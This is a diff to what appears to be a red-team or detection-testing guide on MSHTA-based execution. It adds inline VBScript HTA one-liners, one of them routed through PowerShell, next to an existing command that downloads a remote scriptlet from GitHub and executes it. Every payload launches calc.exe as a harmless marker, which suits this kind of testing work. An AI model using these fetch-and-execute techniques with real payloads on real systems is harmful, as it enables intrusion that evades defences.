@@ -17,6 +17,12 @@ The command will use MSHTA to download a payload that executes calc.exe
 ### Standard Execution
 mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct").Exec();close();
 
+### Local Payload
+mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""calc.exe"""))</script>'"
+
+### Local Payload w/ Powershell
+mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20calc.exe"""))</script>'"
+
 ### Download and Display the Payload
 mshta https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct
 
